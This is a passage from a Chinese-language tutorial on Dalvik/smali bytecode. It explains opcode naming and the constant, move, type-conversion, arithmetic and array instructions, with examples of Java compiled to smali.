\u8868\u793a\u5e38\u91cf\u6c60\u7d22\u5f15\u503c\uff0c\u5176\u4e2dkind\u8868\u793a\u5e38\u91cf\u6c60\u7c7b\u578b\uff0c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u56db\u79cd\u7c7b\u578b string\uff0c\u5b57\u7b26\u4e32\u5e38\u91cf\u6c60\u7d22\u5f15 type\uff0c\u7c7b\u578b\u5e38\u91cf\u6c60\u7d22\u5f15 field\uff0c\u5b57\u6bb5\u5e38\u91cf\u6c60\u7d22\u5f15 meth\uff0c\u65b9\u6cd5\u5e38\u91cf\u6c60\u7d22\u5f15 \u4ee5\u6307\u4ee4 op vAA, type@BBBB \u4e3a\u4f8b\uff0c\u6307\u4ee4\u4f7f\u7528\u4e861\u4e2a\u5bc4\u5b58\u5668vAA\uff0c\u4e00\u4e2a32\u4f4d\u7684\u7c7b\u578b\u5e38\u91cf\u6c60\u7d22\u5f15\u3002 \u6307\u4ee4\u7279\u70b9 \u00b6 Dalvik\u6307\u4ee4\u5728\u8c03\u7528\u89c4\u8303\u4e0a\u5927\u81f4\u6a21\u4eff\u5e38\u89c1\u7684\u67b6\u6784\u548c C \u6837\u5f0f\u7684\u8c03\u7528\u89c4\u8303\uff0c\u5982\u4e0b \u53c2\u6570\u987a\u5e8f\u4e3a Dest-then-source \u3002 \u5229\u7528\u540e\u7f00\u7528\u6765\u8868\u660e\u8fd0\u7b97\u7c7b\u578b\uff0c\u4ece\u800c\u6d88\u9664\u6b67\u4e49\uff1a \u6b63\u5e38\u768432 \u4f4d\u8fd0\u7b97\u4e0d\u6807\u8bb0\u3002 \u6b63\u5e38\u573064 \u4f4d\u8fd0\u7b97\u4ee5 -wide \u4e3a\u540e\u7f00\u3002 \u7279\u5b9a\u7c7b\u578b\u7684\u8fd0\u7b97\u7801\u4ee5\u5176\u7c7b\u578b\uff08\u6216\u7b80\u5355\u7f29\u5199\uff09\u4e3a\u540e\u7f00\uff0c\u8fd9\u4e9b\u7c7b\u578b\u5305\u62ec\uff1a -boolean \u3001 -byte \u3001 -char \u3001 -short \u3001 -int \u3001 -long \u3001 -float \u3001 -double \u3001 -object \u3001 -string \u3001 -class \u548c -void \u3002 \u5229\u7528\u8fd0\u7b97\u7801\u90e8\u5206\u540e\u7f00\u533a\u5206\u5177\u6709\u4e0d\u540c\u6307\u4ee4\u6837\u5f0f\u6216\u8005\u6216\u9009\u9879\u7684\u76f8\u540c\u8fd0\u7b97\uff0c\u8fd9\u4e9b\u540e\u7f00\u4e0e\u4e3b\u8981\u540d\u79f0\u4e4b\u95f4\u4ee5 / \u5206\u5f00\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u4f7f\u751f\u6210\u548c\u89e3\u6790\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u4e2d\u5b58\u5728\u4e0e\u9759\u6001\u5e38\u91cf\u7684\u4e00\u5bf9\u4e00\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u4fbf\u4e8e\u964d\u4f4e\u8ba9\u8bfb\u8005\u611f\u5230\u6a21\u7cca\u4e0d\u6e05\u7684\u53ef\u80fd\u6027\u3002 \u4f8b\u5982\uff0c\u5728\u6307\u4ee4 move-wide/from16 vAA, vBBBB \u4e2d move \u4e3a\u57fa\u7840\u8fd0\u7b97\u7801\uff0c\u8868\u793a\u8fd9\u662f\u57fa\u672c\u8fd0\u7b97\uff0c\u7528\u6765\u79fb\u52a8\u5bc4\u5b58\u5668\u7684\u503c\u3002 wide \u4e3a\u540d\u79f0\u540e\u7f00\uff0c\u8868\u793a\u6307\u4ee4\u5bf964 \u4f4d\u6570\u636e\u8fdb\u884c\u8fd0\u7b97\u3002 from16 \u4e3a\u8fd0\u7b97\u7801\u540e\u7f00\uff0c\u8868\u793a\u6e90\u4e3a\u4e00\u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\u7684\u5f15\u7528\u53d8\u91cf\u3002 vAA \u4e3a\u76ee\u7684\u5bc4\u5b58\u5668\uff0c\u53d6\u503c\u8303\u56f4\u4e3a v0 - v255 \u3002 vBBBB \u4e3a\u6e90\u5bc4\u5b58\u5668\uff0c\u53d6\u503c\u8303\u56f4\u4e3a v0 - v65535 \u3002 \u5177\u4f53\u6307\u4ee4 \u00b6 \u8fd9\u91cc\uff0c\u6211\u4eec\u5177\u4f53\u4ecb\u7ecd\u4f9d\u6b21\u6bcf\u4e00\u6761\u6307\u4ee4\u7684\u542b\u4e49\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u5bf9\u5176\u8fdb\u884c\u5206\u7c7b\u3002 \u7a7a\u6307\u4ee4 \u00b6 nop\u6307\u4ee4\uff0c\u65e0\u4efb\u4f55\u64cd\u4f5c\uff0c\u4e00\u822c\u7528\u4e8e\u5bf9\u9f50\u4ee3\u7801\u3002 \u6570\u636e\u5b9a\u4e49\u6307\u4ee4 \u00b6 op&id \u8bed\u6cd5 \u53c2\u6570 \u8bf4\u660e 2 11n const/4 vA, #+B A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff084 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 13 21s const/16 vAA, #+BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 14 31i const vAA, #+BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u4efb\u610f 32 \u4f4d\u5e38\u91cf \u5c06\u7ed9\u5b9a\u7684\u503c\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 15 21h const/high16 vAA, #+BBBB0000 A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u53f3\u96f6\u6269\u5c55\u4e3a 32 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 16 21s const-wide/16 vAA, #+BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 17 31i const-wide/32 vAA, #+BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0832 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u7b26\u53f7\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 18 51l const-wide vAA, #+BBBBBBBBBBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u4efb\u610f\u53cc\u5b57\u5bbd\u5ea6\uff0864 \u4f4d\uff09\u5e38\u91cf \u5c06\u7ed9\u5b9a\u7684\u503c\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 19 21h const-wide/high16 vAA, #+BBBB000000000000 A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6709\u7b26\u53f7\u6574\u6570\uff0816 \u4f4d\uff09 \u5c06\u7ed9\u5b9a\u7684\u503c\uff08\u53f3\u96f6\u6269\u5c55\u4e3a 64 \u4f4d\uff09\u79fb\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u5bf9\u4e2d\u3002 1a 21c const-string vAA, string@BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u5b57\u7b26\u4e32\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u5f15\u7528\u8d4b\u503c\u7ed9\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 1b 31c const-string/jumbo vAA, string@BBBBBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u5b57\u7b26\u4e32\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u5b57\u7b26\u4e32\u5f15\u7528\uff08\u8f83\u5927\uff09\u8d4b\u503c\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002 1c 21c const-class vAA, type@BBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u7c7b\u578b\u7d22\u5f15 \u5c06\u7ed9\u5b9a\u7c7b\u5f15\u7528\u8d4b\u503c\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\u3002\u5982\u679c\u6307\u5b9a\u7684\u7c7b\u578b\u662f\u539f\u59cb\u7c7b\u578b\uff0c\u5219\u5c06\u5b58\u50a8\u5bf9\u539f\u59cb\u7c7b\u578b\u7684\u9000\u5316\u7c7b\u7684\u5f15\u7528\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679cjava\u4ee3\u7801\u5982\u4e0b boolean z = true ; z = false ; byte b = 1 ; short s = 2 ; int i = 3 ; long l = 4 ; float f = 0.1f ; double d = 0.2 ; String str = \"test\" ; Class c = Object . class ; \u90a3\u4e48\u7f16\u8bd1\u4e4b\u540e\u5f97\u5230\u7684\u4ee3\u7801\u5982\u4e0b const/4 v10 , 0x1 const/4 v10 , 0x0 const/4 v0 , 0x1 const/4 v8 , 0x2 const/4 v5 , 0x3 const-wide/16 v6 , 0x4 const v4 , 0x3dcccccd # 0.1f const-wide v2 , 0x3fc999999999999a L # 0.2 const-string v9 , \"test\" const-class v1 , L java/lang/ Object ; \u53ef\u4ee5\u770b\u51fa\uff0c\u6839\u636e\u6570\u636e\u7c7b\u578b\u5927\u5c0f\u7684\u4e0d\u540c\uff0c\u4f1a\u91c7\u7528\u4e0d\u540c\u7684\u8bed\u6cd5\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230float\u7684\u5b57\u9762\u503c\u662f0x3dcccccd\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f0.1\u3002\u5173\u4e8e\u6d6e\u70b9\u6570\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u5b58\u5728\u5f62\u5f0f\uff0c\u8bf7\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0csmali\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5c06string\u7684id\u8f6c\u6362\u4e3a\u5176\u771f\u6b63\u7684\u5b57\u7b26\u4e32\u3002 \u6570\u636e\u79fb\u52a8 \u00b6 \u6570\u636e\u79fb\u52a8\u6307\u4ee4\u4e3b\u8981\u662f\u5c06\u6570\u636e\u4ece\u4e00\u4e2a\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u4e2d\u79fb\u52a8\u5230\u53e6\u4e00\u5904\u3002 op&id \u8bed\u6cd5 \u53c2\u6570 \u8bf4\u660e 01 12x move vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 vA=vB 02 22x move/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 vAA=vBBBB 03 32x move/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 vAAAA=VBBBB 04 12x move-wide vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9\uff084 \u4f4d\uff09 vA\uff0cv(A+1)=vB\uff0cV(B+1) 05 22x move-wide/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9(16 bit) vAA\uff0cv(AA+1)=vBBBB\uff0cV(BBBB+1) 06 32x move-wide/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\u5bf9(16 bit) vAAAA\uff0cv(AAAA+1)=vBBBB\uff0cV(BBBB+1) 07 12x move-object vA, vB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff084 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvA=vB 08 22x move-object/from16 vAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvAA=vBBBB 09 32x move-object/16 vAAAA, vBBBB A: \u76ee\u6807\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 B: \u6e90\u5bc4\u5b58\u5668\uff0816 \u4f4d\uff09 \u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\uff0cvAAAA=vBBBB 0a 11x move-result vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c\u653e\u5230VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0b 11x move-result-wide vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\u5bf9\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c\u653e\u5230VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0c 11x move-result-object vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u5bf9\u8c61\u5f15\u7528VAA\u5bc4\u5b58\u5668\u4e2d\u3002 0d 11x move-exception vAA A: \u76ee\u6807\u5bc4\u5b58\u5668\uff088 \u4f4d\uff09 \u5c06\u6355\u83b7\u7684\u5f02\u5e38\u4fdd\u5b58\u5230\u7ed9\u5b9a\u5bc4\u5b58\u5668\u4e2d\u3002 \u5176\u4e2d\uff0c move \u7cfb\u5217\u6307\u4ee4\u4ee5\u53ca move-result \u7528\u4e8e\u5904\u7406\u5c0f\u4e8e\u7b49\u4e8e 32 \u4f4d\u7684\u57fa\u672c\u7c7b\u578b\u3002 move-wide \u7cfb\u5217\u6307\u4ee4\u548c move-result-wide \u7528\u4e8e\u5904\u740664\u4f4d\u7c7b\u578b\uff0c\u5305\u62ec long \u548c double \u7c7b\u578b\u3002 move-object \u7cfb\u5217\u6307\u4ee4\u548c move-result-object \u7528\u4e8e\u5904\u7406\u5bf9\u8c61\u5f15\u7528\u3002 \u6b64\u5916\uff0c\u540e\u7f00\uff08 /from16 \u3001 /16 \uff09\u53ea\u5f71\u54cd\u5b57\u8282\u7801\u7684\u4f4d\u6570\u548c\u5bc4\u5b58\u5668\u7684\u8303\u56f4\uff0c\u4e0d\u5f71\u54cd\u6307\u4ee4\u7684\u903b\u8f91\u3002 \u6570\u636e\u8f6c\u6362\u6307\u4ee4 \u00b6 \u6570\u636e\u8f6c\u6362\u6307\u4ee4\u4e3b\u8981\u662f\u5c06\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002\u76ee\u524d\u5df2\u6709\u7684\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e neg-int \u5bf9\u6574\u578b\u6570\u6c42\u8865 not-int \u5bf9\u6574\u578b\u6570\u6c42\u53cd neg-long \u5bf9\u957f\u6574\u578b\u6570\u6c42\u8865 not-long \u5bf9\u957f\u6574\u578b\u6570\u6c42\u53cd neg-float \u5bf9\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u6c42\u8865 neg-double \u5bf9\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u6c42\u8865 int-to-long \u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b int-to-float \u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570 int-to-dobule \u5c06\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 long-to-int \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u6574\u578b long-to-float \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b long-to-double \u5c06\u957f\u6574\u578b\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b float-to-int \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u6574\u578b float-to-long \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b\u6570 float-to-double \u5c06\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570 double-to-int \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u6574\u578b double-to-long \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u957f\u6574\u578b double-to-float \u5c06\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u6362\u4e3a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b int-to-byte \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u5b57\u8282\u578b int-to-char \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u5b57\u7b26\u578b int-to-short \u5c06\u6574\u578b\u8f6c\u6362\u4e3a\u77ed\u6574\u578b \u4e3e\u4e2a\u4f8b\u5b50 int-to-short v0,v1 \u5373\u5c06\u5bc4\u5b58\u5668v1\u7684\u503c\u5f3a\u5236\u8f6c\u6362\u4e3ashort\u7c7b\u578b\uff0c\u5e76\u653e\u5165v0\u4e2d\u3002 \u6570\u5b66\u8fd0\u7b97\u6307\u4ee4 \u00b6 \u6570\u5b66\u7b97\u6307\u4ee4\u5305\u62ec\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u4e0e\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u3002\u5176\u4e2d\uff0c\u7b97\u672f\u8fd0\u7b97\u6307\u4ee4\u5305\u62ec\u52a0\uff0c\u51cf\uff0c\u4e58\uff0c\u9664\uff0c\u6a21\uff0c\u79fb\u4f4d\u7b49\u8fd0\u7b97\uff0c\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u4e3b\u8981\u8fdb\u884c\u6570\u503c\u95f4\u4e0e\uff0c\u6216\uff0c\u975e\uff0c\u6291\u6216\u7b49\u8fd0\u7b97\u3002 \u6570\u636e\u8fd0\u7b97\u6307\u4ee4\u6709\u4ee5\u4e0b\u56db\u7c7b\uff0c\u5176\u4e2d\u8fd0\u7b97\u7b26\u4e3abinop\u3002 \u6307\u4ee4 \u8bf4\u660e binop vAA, vBB, vCC \u5c06vBB\u5bc4\u5b58\u5668\u4e0evCC\u5bc4\u5b58\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vAA\u5bc4\u5b58\u5668 binop/2addr vA, vB \u5c06vA\u5bc4\u5b58\u5668\u4e0evB\u5bc4\u5b58\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vA\u5bc4\u5b58\u5668 binop/lit16 vA, vB, #+CCCC \u5c06vB\u5bc4\u5b58\u5668\u4e0e\u5e38\u91cf CCCC\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vA\u5bc4\u5b58\u5668 binop/lit8 vAA, vBB, #+CC \u5c06vBB\u5bc4\u5b58\u5668\u4e0e\u5e38\u91cfCC\u8fdb\u884c\u8fd0\u7b97\uff0c\u7ed3\u679c\u4fdd\u5b58\u5230vAA\u5bc4\u5b58\u5668 \u540e\u97623\u7c7b\u6307\u4ee4\u6bd4\u7b2c1\u7c7b\u6307\u4ee4\u5206\u522b\u591a\u51fa\u4e862addr\uff0clit16\uff0clit8\u540e\u7f00\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u57fa\u7840\u5b57\u8282\u7801\u76f8\u540c\u7684\u6307\u4ee4\u6765\u8bf4\uff0c\u5176\u6267\u884c\u7684\u8fd0\u7b97\u64cd\u4f5c\u662f\u7c7b\u4f3c\u7684\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u7b2c\u4e00\u7c7b\u6307\u4ee4\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6839\u636e\u6570\u636e\u7684\u7c7b\u578b\u4e0d\u540c\u4f1a\u5728\u57fa\u7840\u5b57\u8282\u7801\u540e\u9762\u52a0\u4e0a\u6570\u636e\u7c7b\u578b\u540e\u7f00\uff0c\u5982 -int \u6216 -long \u5206\u522b\u8868\u793a\u64cd\u4f5c\u7684\u6570\u636e\u7c7b\u578b\u4e3a\u6574\u578b\u4e0e\u957f\u6574\u578b\u3002\u7b2c\u4e00\u7c7b\u6307\u4ee4\u7684\u8fd0\u7b97\u7c7b\u578b\u5982\u4e0b \u8fd0\u7b97\u7c7b\u578b \u8bf4\u660e add-type vBB + vCC sub-type vBB - vCC mul-type vBB * vCC div-type vBB / vCC rem-type vBB % vCC and-type vBB & vCC or-type vBB | vCC xor-type vBB ^ vCC shl-type vBB << vCC \uff0c\u6709\u7b26\u53f7\u6570\u5de6\u79fb shr-type vBB >> vCC\uff0c\u6709\u7b26\u53f7\u6570\u53f3\u79fb ushr-type vBB >>> vCC\uff0c\u65e0\u7b26\u53f7\u6570\u53f3\u79fb \u5176\u4e2d\u57fa\u7840\u5b57\u8282\u7801\u540e\u9762\u7684-type\u53ef\u4ee5\u662f-int\uff0c-long\uff0c -float\uff0c-double\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cjava\u6e90\u7801\u4e3a int a = 5 , b = 2 ; a += b ; a -= b ; a *= b ; a /= b ; a %= b ; a &= b ; a |= b ; a ^= b ; a <<= b ; a >>= b ; a >>>= b ; \u5176\u5bf9\u5e94\u7684smali\u4e3a const/4 v0 , 0x5 const/4 v1 , 0x2 add-int/2addr v0 , v1 sub-int/2addr v0 , v1 mul-int/2addr v0 , v1 div-int/2addr v0 , v1 rem-int/2addr v0 , v1 and-int/2addr v0 , v1 or-int/2addr v0 , v1 xor-int/2addr v0 , v1 shl-int/2addr v0 , v1 shr-int/2addr v0 , v1 ushr-int/2addr v0 , v1 \u6570\u7ec4\u64cd\u4f5c\u6307\u4ee4 \u00b6 \u6570\u7ec4\u64cd\u4f5c\u6307\u4ee4\u4e2d\u5b9e\u73b0\u4e86\u83b7\u53d6\u6570\u7ec4\u957f\u5ea6\uff0c\u65b0\u5efa\u6570\u7ec4\uff0c\u6570\u7ec4\u8d4b\u503c\uff0c\u6570\u7ec4\u5143\u7d20\u53d6\u503c\u4e0e\u8d4b\u503c\u7b49\u64cd\u4f5c\u3002 \u6307\u4ee4 \u8bf4\u660e array-length vA, vB \u83b7\u53d6\u7ed9\u5b9avB\u5bc4\u5b58\u5668\u4e2d\u6570\u7ec4\u7684\u957f\u5ea6\u5e76\u8d4b\u7ed9vA\u5bc4\u5b58\u5668\uff0c\u6570\u7ec4\u957f\u5ea6\u6307\u7684\u662f\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u4e2a\u6570\u3002 new-array vA, vB, type@CCCC \u6784\u9020\u5927\u5c0f\u4e3avB\u7684\u5143\u7d20\u7c7b\u578b\u4e3atype@CCCC\u7684\u6570\u7ec4\uff0c\u5e76\u5c06\u5f15\u7528\u8d4b\u7ed9vA\u5bc4\u5b58\u5668 filled-new-array {vC, vD, vE, vF, vG},type@BBBB \u6784\u9020\u5927\u5c0fvA\u7684\u5143\u7d20\u7c7b\u578b\u4e3atype@BBBB\u7684\u6570\u7ec4\u5e76\u586b\u5145\u6570\u7ec4\u5185\u5bb9\u3002vA\u5bc4\u5b58\u5668\u662f\u9690\u542b\u4f7f\u7528\u7684\uff0c\u9664\u4e86\u6307\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\u5916\u8fd8\u6307\u5b9a\u4e86\u53c2\u6570\u7684\u4e2a\u6570\uff0cvC~vG\u662f\u4f7f\u7528\u5230\u7684\u53c2\u6570\u5bc4\u5b58\u5e8f\u5217 filled-new-array/range {vCCCC ..vNNNN}, type@BBBB \u6307\u4ee4\u529f\u80fd\u4e0efilled-new-array {vC, vD, vE, vF, vG},type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u53c2\u6570\u5bc4\u5b58\u5668\u4f7f\u7528range\u540e\u7f00\u6307\u5b9a\u4e86\u53d6\u503c\u8303\u56f4 \uff0cvC\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc4\u5b58\u5668\uff0cN = A +C -1 fill-array-data vAA, +BBBBBBBB \u7528\u6307\u5b9a\u7684\u6570\u636e\u6765\u586b\u5145\u6570\u7ec4\uff0cvAA\u5bc4\u5b58\u5668\u4e3a\u6570\u7ec4\u5f15\u7528\uff0c\u5f15\u7528\u5fc5\u987b\u4e3a\u57fa\u7840\u7c7b\u578b\u7684\u6570\u7ec4\uff0c\u5728\u6307\u4ee4\u540e\u9762\u4f1a\u7d27\u8ddf\u4e00\u4e2a\u6570\u636e\u8868 new-array/jumbo vAAAA, vBBBB,type@CCCCCCCC \u6307\u4ee4\u529f\u80fd\u4e0enew-array vA,vB,type@CCCC\u76f8\u540c\uff0c\u4f46\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 filled-new-array/jumbo {vCCCC ..vNNNN},type@BBBBBBBB \u6307\u4ee4\u529f\u80fd\u4e0efilled-new-array/range {vCCCC ..vNNNN},type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 arrayop vAA, vBB, vCC \u5bf9vBB\u5bc4\u5b58\u5668\u6307\u5b9a\u7684\u6570\u7ec4\u5143\u7d20\u8fdb\u884c\u53d6\u503c\u4e0e\u8d4b\u503c\u3002vCC\u5bc4\u5b58\u5668\u6307\u5b9a\u6570\u7ec4\u5143\u7d20\u7d22\u5f15\uff0cvAA\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u653e\u8bfb\u53d6\u7684\u6216\u9700\u8981\u8bbe\u7f6e\u7684\u6570\u7ec4\u5143\u7d20\u7684\u503c\u3002\u8bfb\u53d6\u5143\u7d20\u4f7f\u7528aget\u7c7b\u6307\u4ee4\uff0c\u5143\u7d20\u8d4b\u503c\u4f7f\u7528aput\u7c7b\u6307\u5b9a\uff0c\u6839\u636e\u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u7c7b\u578b\u6307\u4ee4\u540e\u9762\u4f1a\u7d27\u8ddf\u4e0d\u540c\u7684\u6307\u4ee4\u540e\u7f00\uff0c\u6307\u4ee4\u5217\u8868\u5982\u4e0b\uff1aaget, aget-wide, aget-object, aget-boolean, aget-byte,aget-char, aget-short, aput, aput-wide, aput-object, aput-boolean, aput-byte, aput-char, aput-short\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u6570\u7ec4\u5982\u4e0b int [] arr = new int [ 10 ]; \u5176\u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v1 , 0xa new-array v0 , v1 , I \u5982\u679c\u6211\u4eec\u76f4\u63a5\u5728\u5b9a\u4e49\u65f6\uff0c\u5bf9\u6570\u7ec4\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u4e0b int [ ] arr = { 1 , 2 , 3 , 4 , 5 } ; \u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v1 , 0x1 const/4 v2 , 0x2 const/4 v3 , 0x3 const/4 v4 , 0x4 const/4 v5 , 0x5 filled-new-array { v1 , v2 , v3 , v4 , v5 }, I move-result v0 